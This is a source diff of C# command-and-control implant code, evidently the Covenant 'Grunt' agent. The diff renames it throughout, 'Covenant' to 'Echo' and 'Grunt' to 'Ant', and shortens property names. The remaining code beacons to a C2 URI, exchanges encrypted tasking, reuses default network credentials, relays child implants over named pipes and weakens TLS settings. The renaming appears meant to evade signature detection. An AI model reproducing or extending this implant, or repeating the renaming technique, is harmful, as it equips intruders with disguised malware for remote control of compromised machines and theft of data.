@@ -17,7 +17,7 @@ namespace echoCovEx
 {
     class Ant
     {
-        public static void Execute(string EchoURI, string EchoCertHash, string GUID, Aes SessK)
+        public static void Execute(string EchoURI, string EchoCertHash, string GUID, Aes MySesK)
         {
             try
             {
@@ -69,7 +69,7 @@ namespace echoCovEx
                 bMess.Identifier = GUID;
                 TskMessgr mess = new TskMessgr
                 (
-                    new MessCrftr(GUID, SessK),
+                    new MessCrftr(GUID, MySesK),
                     bMess,
                     new Profl(EchoProGetResp, EchoProPOSTReq, EchoProPOSTResp)
                 );
@@ -499,7 +499,7 @@ namespace echoCovEx
             {
                 return null;
             }
-            else if (AntMess.Type == AntEncMess.GruntEncryptedMessageType.Tasking)
+            else if (AntMess.Type == AntEncMess.AntEncMessTyp.Tasking)
             {
                 string json = this.Crafter.Retrieve(AntMess);
                 return (json == null || json == "") ? null : AntTskMess.FromJson(json);
@@ -747,7 +747,7 @@ namespace echoCovEx
                     this.Pipe = newServerPipe;
                     this.IsConnected = true;
                     this.MonitorPipeState();
-                    // Tell the parent Ant the GUID so that it knows to which child grunt which messages shall be forwarded. Without this amess, any further communication breaks.
+                    // Tell the parent Ant the GUID so that it knows to which child ant which messages shall be forwarded. Without this amess, any further communication breaks.
                     this.UpstreamEventHandler?.Invoke(this, new MessageEventArgs { Message = string.Empty });
                 }
                 // If named pipe became disconnected (!this.IsConnected), then try to re-connect to the SMB server, else continue.
@@ -842,34 +842,34 @@ namespace echoCovEx
         public string Authenticator { get; set; } = "";
         public EventHandler<MessageEventArgs> UpstreamEventHandler { get; set; }
 
-        private string CovenantURI { get; }
-        private MyCWeCli CovenantClient { get; set; } = new MyCWeCli();
+        private string EchoURI { get; }
+        private MyCWeCli EchoCli { get; set; } = new MyCWeCli();
         private object _WebClientLock = new object();
 
         private Random Random { get; set; } = new Random();
-        private List<string> ProfileHttpHeaderNames { get; }
-        private List<string> ProfileHttpHeaderValues { get; }
-        private List<string> ProfileHttpUrls { get; }
+        private List<string> ProHeadName { get; }
+        private List<string> ProHeadVals { get; }
+        private List<string> ProHTURLS { get; }
 
-        private bool UseCertPinning { get; set; }
-        private bool ValidateCert { get; set; }
+        private bool UseCPin { get; set; }
+        private bool ValCert { get; set; }
 
         private Queue<ProMessg> ToReadQueue { get; } = new Queue<ProMessg>();
 
-        public HtpMessgr(string CovenantURI, string CovenantCertHash, bool UseCertPinning, bool ValidateCert, List<string> ProfileHttpHeaderNames, List<string> ProfileHttpHeaderValues, List<string> ProfileHttpUrls)
+        public HtpMessgr(string EchoURI, string EchoCertHash, bool UseCPin, bool ValCert, List<string> EchoProHeaderNames, List<string> EchoProHeaderVFals, List<string> ProURLS)
         {
-            this.CovenantURI = CovenantURI;
-            this.Hostname = CovenantURI.Split(':')[1].Split('/')[2];
-            this.ProfileHttpHeaderNames = ProfileHttpHeaderNames;
-            this.ProfileHttpHeaderValues = ProfileHttpHeaderValues;
-            this.ProfileHttpUrls = ProfileHttpUrls;
+            this.EchoURI = EchoURI;
+            this.Hostname = EchoURI.Split(':')[1].Split('/')[2];
+            this.ProHeadName = EchoProHeaderNames;
+            this.ProHeadVals = EchoProHeaderVFals;
+            this.ProHTURLS = ProURLS;
 
-            this.CovenantClient.UseDefaultCredentials = true;
-            this.CovenantClient.Proxy = WebRequest.DefaultWebProxy;
-            this.CovenantClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
+            this.EchoCli.UseDefaultCredentials = true;
+            this.EchoCli.Proxy = WebRequest.DefaultWebProxy;
+            this.EchoCli.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
 
-            this.UseCertPinning = UseCertPinning;
-            this.ValidateCert = ValidateCert;
+            this.UseCPin = UseCPin;
+            this.ValCert = ValCert;
 
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
             try { ServicePointManager.SecurityProtocol = ServicePointManager.SecurityProtocol | SecurityProtocolType.Ssl3; } catch { }
@@ -880,11 +880,11 @@ namespace echoCovEx
             ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
             {
                 bool valid = true;
-                if (this.UseCertPinning && CovenantCertHash != "")
+                if (this.UseCPin && EchoCertHash != "")
                 {
-                    valid = cert.GetCertHashString() == CovenantCertHash;
+                    valid = cert.GetCertHashString() == EchoCertHash;
                 }
-                if (valid && this.ValidateCert)
+                if (valid && this.ValCert)
                 {
                     valid = errors == System.Net.Security.SslPolicyErrors.None;
                 }
@@ -901,7 +901,7 @@ namespace echoCovEx
             lock (this._WebClientLock)
             {
                 this.SetupCookieWebClient();
-                return new ProMessg { Type = MessageType.Read, Message = this.CovenantClient.DownloadString(this.CovenantURI + this.GetURL()) };
+                return new ProMessg { Type = MessageType.Read, Message = this.EchoCli.DownloadString(this.EchoURI + this.GetURL()) };
             }
         }
 
@@ -910,7 +910,7 @@ namespace echoCovEx
             lock (this._WebClientLock)
             {
                 this.SetupCookieWebClient();
-                ProMessg ToReadMessage = new ProMessg { Type = MessageType.Write, Message = this.CovenantClient.UploadString(this.CovenantURI + this.GetURL(), Message) };
+                ProMessg ToReadMessage = new ProMessg { Type = MessageType.Write, Message = this.EchoCli.UploadString(this.EchoURI + this.GetURL(), Message) };
                 if (ToReadMessage.Message != "")
                 {
                     this.ToReadQueue.Enqueue(ToReadMessage);
@@ -922,20 +922,20 @@ namespace echoCovEx
 
         private string GetURL()
         {
-            return this.ProfileHttpUrls[this.Random.Next(this.ProfileHttpUrls.Count)].Replace("{GUID}", this.Identifier);
+            return this.ProHTURLS[this.Random.Next(this.ProHTURLS.Count)].Replace("{GUID}", this.Identifier);
         }
 
         private void SetupCookieWebClient()
         {
-            for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
+            for (int i = 0; i < ProHeadVals.Count; i++)
             {
-                if (ProfileHttpHeaderNames[i] == "Cookie")
+                if (ProHeadName[i] == "Cookie")
                 {
-                    this.CovenantClient.SetCookies(new Uri(this.CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", this.Identifier));
+                    this.EchoCli.SetCookies(new Uri(this.EchoURI), ProHeadVals[i].Replace(";", ",").Replace("{GUID}", this.Identifier));
                 }
                 else
                 {
-                    this.CovenantClient.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", this.Identifier), ProfileHttpHeaderValues[i].Replace("{GUID}", this.Identifier));
+                    this.EchoCli.Headers.Set(ProHeadName[i].Replace("{GUID}", this.Identifier), ProHeadVals[i].Replace("{GUID}", this.Identifier));
                 }
             }
         }
@@ -1027,10 +1027,10 @@ namespace echoCovEx
         public string Message { get; set; }
         public bool Token { get; set; }
 
-        private static string GruntTaskingMessageFormat = @"{{""type"":""{0}"",""name"":""{1}"",""amess"":""{2}"",""token"":{3}}}";
+        private static string AntTskMessForm = @"{{""type"":""{0}"",""name"":""{1}"",""amess"":""{2}"",""token"":{3}}}";
         public static AntTskMess FromJson(string message)
         {
-            List<string> parseList = Utilities.Parse(message, GruntTaskingMessageFormat);
+            List<string> parseList = Utilities.Parse(message, AntTskMessForm);
             if (parseList.Count < 3) { return null; }
             return new AntTskMess
             {
@@ -1044,7 +1044,7 @@ namespace echoCovEx
         public static string ToJson(AntTskMess message)
         {
             return String.Format(
-                GruntTaskingMessageFormat,
+                AntTskMessForm,
                 message.Type.ToString("D"),
                 Utilities.JavaScriptStringEncode(message.Name),
                 Utilities.JavaScriptStringEncode(message.Message),
@@ -1085,14 +1085,14 @@ namespace echoCovEx
 
     public class AntEncMess
     {
-        public enum GruntEncryptedMessageType
+        public enum AntEncMessTyp
         {
             Routing,
             Tasking
         }
 
         public string GUID { get; set; } = "";
-        public GruntEncryptedMessageType Type { get; set; }
+        public AntEncMessTyp Type { get; set; }
         public string Meta { get; set; } = "";
         public string IV { get; set; } = "";
         public string EncryptedMessage { get; set; } = "";
@@ -1120,7 +1120,7 @@ namespace echoCovEx
             return new AntEncMess
             {
                 GUID = parseList[0],
-                Type = (GruntEncryptedMessageType)int.Parse(parseList[1]),
+                Type = (AntEncMessTyp)int.Parse(parseList[1]),
                 Meta = parseList[2],
                 IV = parseList[3],
                 EncryptedMessage = parseList[4],
